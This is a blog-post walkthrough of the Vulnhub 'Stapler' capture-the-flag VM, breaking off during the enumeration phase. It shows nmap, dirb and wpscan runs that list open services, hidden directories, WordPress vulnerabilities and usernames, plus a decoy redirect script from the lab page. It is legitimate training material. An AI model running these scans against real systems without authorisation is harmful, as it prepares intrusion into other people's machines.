---
layout: post
title:  "Vulnhub - Stapler"
date:   2016-09-02 16:07:19
categories: [walkthrough]
comments: false
---
An Office Space themed VM [Stapler](https://www.vulnhub.com/entry/stapler-1,150/) written by [g0tmi1k](https://www.vulnhub.com/author/g0tmi1k,21/), sounded like a bunch of fun.  So I decided to get it a try.

<!--more-->

## Description
{% highlight text %}
+---------------------------------------------------------+
|                                                         |
|                                  __..--''\              |
|                          __..--''         \             |
|                  __..--''          __..--''             |
|          __..--''          __..--''       |             |
|          \ o        __..--''____....----""              |
|           \__..--''\                                    |
|           |         \                                   |
|          +----------------------------------+           |
|          +----------------------------------+           |
|                                                         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|   Name: Stapler           |          IP: DHCP           |
|   Date: 2016-June-08      |        Goal: Get Root!      |
| Author: g0tmi1k           | Difficultly: ??? ;)         |
+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+
|                                                         |
| + Average beginner/intermediate VM, only a few twists   |
|   + May find it easy/hard (depends on YOUR background)  |
|   + ...also which way you attack the box                |
|                                                         |
| + It SHOULD work on both VMware and Virtualbox          |
|   + REBOOT the VM if you CHANGE network modes           |
|   + Fusion users, you'll need to retry when importing   |
|                                                         |
| + There are multiple methods to-do this machine         |
|   + At least two (2) paths to get a limited shell       |
|   + At least three (3) ways to get a root access        |
|                                                         |
| + Made for BsidesLondon 2016                            |
|   + Slides: https://download.vulnhub.com/media/stapler/ |
|                                                         |
| + Thanks g0tmi1k, nullmode, rasta_mouse & superkojiman  |
|   + ...and shout-outs to the VulnHub-CTF Team =)        |
|                                                         |
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+
|                                                         |
|       --[[~~Enjoy. Have fun. Happy Hacking.~~]]--       |
|                                                         |
+---------------------------------------------------------+
{% endhighlight %}

## Host Discovery

Starting off host discovery with `netdiscover`

{% highlight bash %}
root@kali:~/evidence/stapler# netdiscover -i eth0 -r 10.0.2.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                      

 6 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 360                                                    
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.2.7        08:00:27:07:d2:95      3     180  Cadmus Computer Systems                                          

root@kali:~/evidence/stapler# -
{% endhighlight %}

Valid host found `10.0.2.7`.  Time to Enumerate.

## Enumeration

Starting off with nmap full port and service detection

{% highlight bash %}
root@kali:~/evidence/stapler# nmap -p 0-65535 10.0.2.7 -sV

Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2016-09-20 23:25 MDT
Nmap scan report for 10.0.2.7
Host is up (0.00021s latency).
Not shown: 65524 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
53/tcp    open   domain      dnsmasq 2.75
80/tcp    open   http
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
666/tcp   open   doom?
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.25BETA2%I=7%D=9/20%Time=57E21A2E%P=x86_64-pc-linux-gnu%r
SF:(GetRequest,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20clo
SF:se\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\x
SF:20533\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found</
SF:title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x20
SF:#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x20
SF:1\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x20
SF:min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset\x
SF:20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010px;
SF:\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family:m
SF:onospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Foun
SF:d</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</code
SF:>\x20was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>")%
SF:r(HTTPOptions,27F,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnection:\x20c
SF:lose\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:
SF:\x20533\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\x20Found
SF:</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20color:\x
SF:20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font-size:\x
SF:201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9999cc;\x
SF:20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\x20inset
SF:\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left:\x2010p
SF:x;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20font-family
SF::monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>Not\x20Fo
SF:und</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url\">/</co
SF:de>\x20was\x20not\x20found\x20on\x20this\x20server\.</p></body></html>"
SF:)%r(FourOhFourRequest,2A2,"HTTP/1\.0\x20404\x20Not\x20Found\r\nConnecti
SF:on:\x20close\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent
SF:-Length:\x20568\r\n\r\n<!doctype\x20html><html><head><title>404\x20Not\
SF:x20Found</title><style>\nbody\x20{\x20background-color:\x20#fcfcfc;\x20
SF:color:\x20#333333;\x20margin:\x200;\x20padding:0;\x20}\nh1\x20{\x20font
SF:-size:\x201\.5em;\x20font-weight:\x20normal;\x20background-color:\x20#9
SF:999cc;\x20min-height:2em;\x20line-height:2em;\x20border-bottom:\x201px\
SF:x20inset\x20black;\x20margin:\x200;\x20}\nh1,\x20p\x20{\x20padding-left
SF::\x2010px;\x20}\ncode\.url\x20{\x20background-color:\x20#eeeeee;\x20fon
SF:t-family:monospace;\x20padding:0\x202px;}\n</style>\n</head><body><h1>N
SF:ot\x20Found</h1><p>The\x20requested\x20resource\x20<code\x20class=\"url
SF:\">/nice%20ports%2C/Tri%6Eity\.txt%2ebak</code>\x20was\x20not\x20found\
SF:x20on\x20this\x20server\.</p></body></html>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port666-TCP:V=7.25BETA2%I=7%D=9/20%Time=57E21A28%P=x86_64-pc-linux-gnu%
SF:r(NULL,18F8,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0
SF:\0\x152\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x
SF:01\x04\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88
SF:A@\xa2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E
SF:\xa2\x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\
SF:x0f\xb2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7
SF:\xaeu\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x
SF:99\xd3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\x
SF:f8\xa0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xc
SF:e\[\x87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\
SF:x8b\xf4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\
SF:xe0\xdc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\x
SF:e4\xd5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\x
SF:f1\xaf\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1
SF:\xe2:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\
SF:x1bk\x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9
SF:\xcc\xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1
SF:c\xfd\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3
SF:\xcc\x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|
SF:\xb0\xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\
SF:(\[r\xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5
SF:\xaak\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\
SF:x7fy\xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7
SF:f\x7f\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82
SF:\xcb\[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\
SF:xf9\xcc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x
SF:8f\xa7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f
SF:\x81\xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0
SF:bI\x96\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xca
SF:p\x8f\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb
SF:&\xf4\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC
SF:\xcd\x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\x
SF:bc\xbcL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf
SF:5\xf0\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15
SF:\x04\xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6
SF:GTQ\xf3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P
SF:\x11\?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:07:D2:95 (Oracle VirtualBox virtual NIC)
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.40 seconds
root@kali:~/evidence/stapler# -
{% endhighlight %}

Some intersting ports there, lots to look at.  Going to start High to Low.


## TCP/12380 - https

Going to start with the oddly placed HTTPS server, lets see what it is

{% highlight html %}
Internal Index Page!
{% endhighlight %}

Interesting, internal page, those tend to be good.  Lets brute some directories on this server to see what shows up

{% highlight bash %}
root@kali:~/evidence/stapler# dirb https://10.0.2.7:12380 -R

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 20 23:26:01 2016
URL_BASE: https://10.0.2.7:12380/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
OPTION: Interactive Recursion

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: https://10.0.2.7:12380/ ----
==> DIRECTORY: https://10.0.2.7:12380/announcements/                                                                
+ https://10.0.2.7:12380/index.html (CODE:200|SIZE:21)                                                              
==> DIRECTORY: https://10.0.2.7:12380/javascript/                                                                   
==> DIRECTORY: https://10.0.2.7:12380/phpmyadmin/                                                                   
+ https://10.0.2.7:12380/robots.txt (CODE:200|SIZE:59)                                                              
+ https://10.0.2.7:12380/server-status (CODE:403|SIZE:299)                                                          

---- Entering directory: https://10.0.2.7:12380/announcements/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: https://10.0.2.7:12380/javascript/ ----
(?) Do you want to scan this directory (y/n)? y                                                                      ==> DIRECTORY: https://10.0.2.7:12380/javascript/jquery/                                                            

---- Entering directory: https://10.0.2.7:12380/phpmyadmin/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.

---- Entering directory: https://10.0.2.7:12380/javascript/jquery/ ----
(?) Do you want to scan this directory (y/n)? n                                
Skipping directory.

-----------------
END_TIME: Tue Sep 20 23:26:23 2016
DOWNLOADED: 9224 - FOUND: 3
{% endhighlight %}

Alright got some directories to look into `/announcements` and `/phpmyadmin` in particular.  Lets check for a `robots.txt`

{% highlight text %}
User-agent: *
Disallow: /admin112233/
Disallow: /blogblog/
{% endhighlight %}

Another two directories to look at `/admin112233` and `/blogblog`.

Checking `/announcements` reveals a single file called `message.txt` that contains partial message:

{% highlight text %}
Abby, we need to link the folder somewhere! Hidden at the mo
{% endhighlight %}

Checking `/admin112233` we get basically a warning/honeypot statement about good ole BeEF:

{% highlight html %}
<html>
<head>
<title>mwwhahahah</title>
<body>
<noscript>Give yourself a cookie! Javascript didn't run =)</noscript>
<script type="text/javascript">window.alert("This could of been a BeEF-XSS hook ;)");window.location="http://www.xss-payloads.com/";</script>
</body>
</html>
{% endhighlight %}

Glad that wasn't malicious =).

`/blogblog` and `/phpmyadmin` are legitimate sites.  Blog contains a wordpress blog, while phpmyadmin is a MySQL web frontend, that will be useful later I'm sure.

## Wordpress Blog Enumeration

First off lets scan the wordpress blog with `wpscan`.

{% highlight bash %}
root@kali:~/evidence/stapler# wpscan --url https://10.0.2.7:12380/blogblog/ --enumerate u
_______________________________________________________________
        __          _______   _____                  
        \ \        / /  __ \ / ____|                 
         \ \  /\  / /| |__) | (___   ___  __ _ _ __  
          \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9.1
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

[+] URL: https://10.0.2.7:12380/blogblog/
[+] Started: Tue Sep 20 23:36:32 2016

[!] The WordPress 'https://10.0.2.7:12380/blogblog/readme.html' file exists exposing a version number
[+] Interesting header: DAVE: Soemthing doesn't look right here
[+] Interesting header: SERVER: Apache/2.4.18 (Ubuntu)
[!] Registration is enabled: https://10.0.2.7:12380/blogblog/wp-login.php?action=register
[+] XML-RPC Interface available under: https://10.0.2.7:12380/blogblog/xmlrpc.php
[!] Upload directory has directory listing enabled: https://10.0.2.7:12380/blogblog/wp-content/uploads/
[!] Includes directory has directory listing enabled: https://10.0.2.7:12380/blogblog/wp-includes/

[+] WordPress version 4.2.1 identified from advanced fingerprinting (Released on 2015-04-27)
[!] 23 vulnerabilities identified from the version number

[!] Title: WordPress 4.1-4.2.1 - Genericons Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/7979
    Reference: https://codex.wordpress.org/Version_4.2.2
[i] Fixed in: 4.2.2

[!] Title: WordPress <= 4.2.2 - Authenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8111
    Reference: https://wordpress.org/news/2015/07/wordpress-4-2-3/
    Reference: https://twitter.com/klikkioy/status/624264122570526720
    Reference: https://klikki.fi/adv/wordpress3.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5623
[i] Fixed in: 4.2.3

[!] Title: WordPress <= 4.2.3 - wp_untrash_post_comments SQL Injection
    Reference: https://wpvulndb.com/vulnerabilities/8126
    Reference: https://github.com/WordPress/WordPress/commit/70128fe7605cb963a46815cf91b0a5934f70eff5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2213
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Timing Side Channel Attack
    Reference: https://wpvulndb.com/vulnerabilities/8130
    Reference: https://core.trac.wordpress.org/changeset/33536
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5730
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Widgets Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8131
    Reference: https://core.trac.wordpress.org/changeset/33529
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5732
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Nav Menu Title Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8132
    Reference: https://core.trac.wordpress.org/changeset/33541
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5733
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.2.3 - Legacy Theme Preview Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8133
    Reference: https://core.trac.wordpress.org/changeset/33549
    Reference: https://blog.sucuri.net/2015/08/persistent-xss-vulnerability-in-wordpress-explained.html
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5734
[i] Fixed in: 4.2.4

[!] Title: WordPress <= 4.3 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8186
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5714
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - User List Table Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8187
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: https://github.com/WordPress/WordPress/commit/f91a5fd10ea7245e5b41e288624819a37adf290a
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-7989
[i] Fixed in: 4.2.5

[!] Title: WordPress <= 4.3 - Publish Post & Mark as Sticky Permission Issue
    Reference: https://wpvulndb.com/vulnerabilities/8188
    Reference: https://wordpress.org/news/2015/09/wordpress-4-3-1/
    Reference: http://blog.checkpoint.com/2015/09/15/finding-vulnerabilities-in-core-wordpress-a-bug-hunters-trilogy-part-iii-ultimatum/
    Reference: http://blog.knownsec.com/2015/09/wordpress-vulnerability-analysis-cve-2015-5714-cve-2015-5715/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5715
[i] Fixed in: 4.2.5

[!] Title: WordPress  3.7-4.4 - Authenticated Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8358
    Reference: https://wordpress.org/news/2016/01/wordpress-4-4-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/7ab65139c6838910426567849c7abed723932b87
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
[i] Fixed in: 4.2.6

[!] Title: WordPress 3.7-4.4.1 - Local URIs Server Side Request Forgery (SSRF)
    Reference: https://wpvulndb.com/vulnerabilities/8376
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36435
    Reference: https://hackerone.com/reports/110801
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2222
[i] Fixed in: 4.2.7

[!] Title: WordPress 3.7-4.4.1 - Open Redirect
    Reference: https://wpvulndb.com/vulnerabilities/8377
    Reference: https://wordpress.org/news/2016/02/wordpress-4-4-2-security-and-maintenance-release/
    Reference: https://core.trac.wordpress.org/changeset/36444
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-2221
[i] Fixed in: 4.2.7

[!] Title: WordPress <= 4.4.2 - SSRF Bypass using Octal & Hexedecimal IP addresses
    Reference: https://wpvulndb.com/vulnerabilities/8473
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/af9f0520875eda686fd13a427fd3914d7aded049
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4029
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Reflected XSS in Network Settings
    Reference: https://wpvulndb.com/vulnerabilities/8474
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://github.com/WordPress/WordPress/commit/cb2b3ed3c7d68f6505bfb5c90257e6aaa3e5fcb9
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6634
[i] Fixed in: 4.5

[!] Title: WordPress <= 4.4.2 - Script Compression Option CSRF
    Reference: https://wpvulndb.com/vulnerabilities/8475
    Reference: https://codex.wordpress.org/Version_4.5
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-6635
[i] Fixed in: 4.5

[!] Title: WordPress 4.2-4.5.1 - MediaElement.js Reflected Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8488
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/a493dc0ab5819c8b831173185f1334b7c3e02e36
    Reference: https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4567
[i] Fixed in: 4.5.2

[!] Title: WordPress <= 4.5.1 - Pupload Same Origin Method Execution (SOME)
    Reference: https://wpvulndb.com/vulnerabilities/8489
    Reference: https://wordpress.org/news/2016/05/wordpress-4-5-2/
    Reference: https://github.com/WordPress/WordPress/commit/c33e975f46a18f5ad611cf7e7c24398948cecef8
    Reference: https://gist.github.com/cure53/09a81530a44f6b8173f545accc9ed07e
    Reference: http://avlidienbrunn.com/wp_some_loader.php
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4566
[i] Fixed in: 4.2.8

[!] Title: WordPress 4.2-4.5.2 - Authenticated Attachment Name Stored XSS
    Reference: https://wpvulndb.com/vulnerabilities/8518
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/4372cdf45d0f49c74bbd4d60db7281de83e32648
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5833
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5834
[i] Fixed in: 4.2.9

[!] Title: WordPress 3.6-4.5.2 - Authenticated Revision History Information Disclosure
    Reference: https://wpvulndb.com/vulnerabilities/8519
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/a2904cc3092c391ac7027bc87f7806953d1a25a1
    Reference: https://www.wordfence.com/blog/2016/06/wordpress-core-vulnerability-bypass-password-protected-posts/
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5835
[i] Fixed in: 4.2.9

[!] Title: WordPress 2.6.0-4.5.2 - Unauthorized Category Removal from Post
    Reference: https://wpvulndb.com/vulnerabilities/8520
    Reference: https://wordpress.org/news/2016/06/wordpress-4-5-3/
    Reference: https://github.com/WordPress/WordPress/commit/6d05c7521baa980c4efec411feca5e7fab6f307c
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-5837
[i] Fixed in: 4.2.9

[!] Title: WordPress 2.5-4.6 - Authenticated Stored Cross-Site Scripting via Image Filename
    Reference: https://wpvulndb.com/vulnerabilities/8615
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/c9e60dab176635d4bfaaf431c0ea891e4726d6e0
    Reference: https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html
    Reference: http://seclists.org/fulldisclosure/2016/Sep/6
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7168
[i] Fixed in: 4.2.10

[!] Title: WordPress 2.8-4.6 - Path Traversal in Upgrade Package Uploader
    Reference: https://wpvulndb.com/vulnerabilities/8616
    Reference: https://wordpress.org/news/2016/09/wordpress-4-6-1-security-and-maintenance-release/
    Reference: https://github.com/WordPress/WordPress/commit/54720a14d85bc1197ded7cb09bd3ea790caa0b6e
    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7169
[i] Fixed in: 4.2.10

[+] WordPress theme in use: bhost - v1.2.9

[+] Name: bhost - v1.2.9
 |  Location: https://10.0.2.7:12380/blogblog/wp-content/themes/bhost/
 |  Readme: https://10.0.2.7:12380/blogblog/wp-content/themes/bhost/readme.txt
[!] The version is out of date, the latest version is 1.3.3
 |  Style URL: https://10.0.2.7:12380/blogblog/wp-content/themes/bhost/style.css
 |  Theme Name: BHost
 |  Theme URI: Author: Masum Billah
 |  Description: Bhost is a nice , clean , beautifull, Responsive and modern design free WordPress Theme. This the...
 |  Author: Masum Billah
 |  Author URI: http://getmasum.net/

[+] Enumerating plugins from passive detection ...
[+] No plugins found

[+] Enumerating usernames ...
[+] Identified the following 10 user/s:
    +----+---------+-----------------+
    | Id | Login   | Name            |
    +----+---------+-----------------+
    | 1  | john    | John Smith      |
    | 2  | elly    | Elly Jones      |
    | 3  | peter   | Peter Parker    |
    | 4  | barry   | Barry Atkins    |
    | 5  | heather | Heather Neville |
    | 6  | garry   | garry           |
    | 7  | harry   | harry           |
    | 8  | scott   | scott           |
    | 9  | kathy   | kathy           |
    | 10 | tim     | tim             |
    +----+---------+-----------------+

[+] Finished: Tue Sep 20 23:36:36 2016
[+] Requests Done: 50
[+] Memory used: 31.805 MB
[+] Elapsed time: 00:00:03
root@kali:~/evidence/stapler# -
{% endhighlight %}

Lots of tasty info there, 10 usernames discovered and various themes.  What about plugins though?  Rerunning wpscan with `--enumerate p` provides one plugin detected

{% highlight bash %}
[+] We found 1 plugins:

[+] Name: akismet
 |  Latest version: 3.2
 |  Location: https://10.0.2.7:12380/blogblog/wp-content/plugins/akismet/

[!] We could not determine a version so all vulnerabilities are printed out

[!] Title: Akismet 2.5.0-3.1.4 - Unauthenticated Stored Cross-Site Scripting (XSS)
    Reference: https://wpvulndb.com/vulnerabilities/8215
    Reference: http://blog.akismet.com/2015/10/13/akismet-3-1-5-wordpress/
    Reference: https://blog.sucuri.net/2015/10/security-advisory-stored-xss-in-akismet-wordpress-plugin.html
[i] Fixed in: 3.1.5
{% endhighlight %}

Lastly lets see if the plugin directory is indexable.

{% highlight html %}
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /blogblog/wp-content/plugins</title>
 </head>
 <body>
<h1>Index of /blogblog/wp-content/plugins</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/blogblog/wp-content/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="advanced-video-embed-embed-videos-or-playlists/">advanced-video-embed-embed-videos-or-playlists/</a></td><td align="right">2015-10-14 13:52  </td><td align="right">  - </td><td>&nbsp;</td></tr>
